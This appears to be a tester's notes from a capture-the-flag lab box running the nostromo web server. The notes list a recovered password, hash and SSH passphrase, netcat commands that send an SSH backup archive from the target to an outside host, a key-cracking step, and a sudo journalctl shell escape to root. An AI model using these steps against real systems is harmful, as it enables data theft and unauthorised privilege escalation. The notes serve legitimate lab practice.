| HOST         | PORT | PROTO | SERVICE  | VERSION                 |
| ------------ | ---- | ----- | -------- | ----------------------- |
| 10.10.10.165 | 22   | tcp   | OpenSSH  | 7.9p1 Debian 10+deb10u1 |
| 10.10.10.165 | 80   | tcp   | nostromo | 1.9.6                   |


## HEADERS
---
HTTP/1.1 200 OK
Date: Sat, 08 Jul 2023 18:03:10 GMT
Server: nostromo 1.9.6
Connection: close
Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
Content-Length: 15674
Content-Type: text/html

---

## DIRECTORIES
---

---

## USERS
---
* david Nowonly4me `$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/` (htpasswd) hunter (ssh passphrase)
* 

---

## NOTES
---
* Nostromo metasploit to get shell
* ssh backup file in `/home/david/public_www/protected-file-area`
* `nc -nvlp 2222 > backup-ssh-identity-files.tgz` on host and `cat backup-ssh-identity-files.tgz | nc 10.10.14.9 2222` on target to transfer the files
* crack id_rsa
* `server-stats.sh` contains `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat`
* journalctl gtfobin
* `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service` then `!/bin/bash`
* 
---
